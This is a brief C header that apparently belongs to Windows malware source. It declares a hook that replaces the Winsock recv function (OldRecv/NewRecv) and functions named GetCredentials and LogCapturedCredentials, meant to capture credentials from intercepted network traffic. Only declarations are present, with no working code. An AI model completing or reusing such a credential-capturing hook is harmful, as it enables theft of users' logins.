#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

typedef int (WINAPI* RECV)(int,char FAR*,int,int);

typedef int (WINAPI* GETPEERNAME)(int,struct sockaddr*,int*);
typedef unsigned short (WINAPI* NTOHS)(unsigned short);

LPSTR GetCredentials(LPSTR,int);
CHAR* CommandCopy(LPSTR,int);
void LogCapturedCredentials(LPSTR,int,LPSTR,SOCKET);

#ifndef __RECV__
#define __RECV__

RECV OldRecv;
int WINAPI NewRecv(int,char FAR*,int,int);

#endif 